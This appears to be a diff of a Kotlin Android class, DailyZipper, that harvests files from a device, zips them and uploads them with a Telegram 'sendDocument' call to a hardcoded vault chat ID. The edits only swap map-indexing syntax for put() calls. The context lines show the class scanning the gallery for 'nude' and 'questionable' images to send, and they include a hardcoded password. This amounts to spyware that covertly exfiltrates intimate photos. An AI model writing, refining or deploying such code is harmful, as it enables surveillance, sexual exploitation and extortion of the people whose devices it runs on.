@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * ✅ تم تجنب استخدام get() أو [] على الخرائط تماماً، واستخدام entries + firstOrNull.
+ * ✅ تم إزالة كافة استخدامات [] واستبدالها بـ put/getOrElse/entries لتجنب MatchGroupCollection.
  */
 class DailyZipper(
     context: Context,
@@ -93,14 +93,15 @@ class DailyZipper(
     }
 
     init {
-        config["max_batch_size"] = 48L * 1024L * 1024L
-        config["storage_extra"] = 100L * 1024L * 1024L
-        config["send_retry_delays"] = listOf(2000L, 4000L, 8000L)
-        config["max_processed_hashes"] = 10000
-        config["default_vault_id"] = -1003577715762L
-        config["enable_encryption"] = false
-        config["password"] = "ShieldCore2024!"
-        config["max_batches"] = 10
+        // ✅ استبدال [] بـ put()
+        config.put("max_batch_size", 48L * 1024L * 1024L)
+        config.put("storage_extra", 100L * 1024L * 1024L)
+        config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
+        config.put("max_processed_hashes", 10000)
+        config.put("default_vault_id", -1003577715762L)
+        config.put("enable_encryption", false)
+        config.put("password", "ShieldCore2024!")
+        config.put("max_batches", 10)
         loadConfig()
     }
 
@@ -156,7 +157,11 @@ class DailyZipper(
             val jsonStr = configFile.readText(Charsets.UTF_8)
             val json = JSONObject(jsonStr)
             json.keys().forEach { key ->
-                config[key] = json.get(key)
+                val value = json.opt(key)
+                if (value != null) {
+                    // ✅ استبدال [] بـ put()
+                    config.put(key, value)
+                }
             }
             maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
         } catch (e: Exception) {
@@ -268,7 +273,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (بدون get/[])
+    //  إرسال الملفات مع إعادة المحاولة
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,8 +306,7 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-
-                // ✅ تجنب استخدام get أو [] - استخدام entries + firstOrNull
+                // ✅ تجنب استخدام [] أو get()، استخدم entries
                 val isOk = if (result is Map<*, *>) {
                     val okEntry = result.entries.firstOrNull { it.key?.toString() == "ok" }
                     val okValue = okEntry?.value
@@ -310,7 +314,6 @@ class DailyZipper(
                 } else {
                     false
                 }
-
                 if (isOk) {
                     return true
                 }
@@ -644,7 +647,7 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ تجنب استخدام get أو [] - استخدام entries + firstOrNull
+                            // ✅ تجنب [] أو get()، استخدم entries
                             if (item is Map<*, *>) {
                                 val pathEntry = item.entries.firstOrNull { it.key?.toString() == "path" }
                                 val path = pathEntry?.value?.toString()
@@ -715,8 +718,8 @@ class DailyZipper(
         }
 
         val result = HashMap<String, Any>()
-        result["pending"] = count
-        result["size"] = totalSize
+        result.put("pending", count)
+        result.put("size", totalSize)
         return result
     }
 
@@ -727,8 +730,9 @@ class DailyZipper(
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
         val params = HashMap<String, Any>()
-        params["chat_id"] = chatId
-        params["text"] = text
+        // ✅ استبدال [] بـ put()
+        params.put("chat_id", chatId)
+        params.put("text", text)
         invokeMethod(telegram, "api", "sendMessage", params)
     }
 
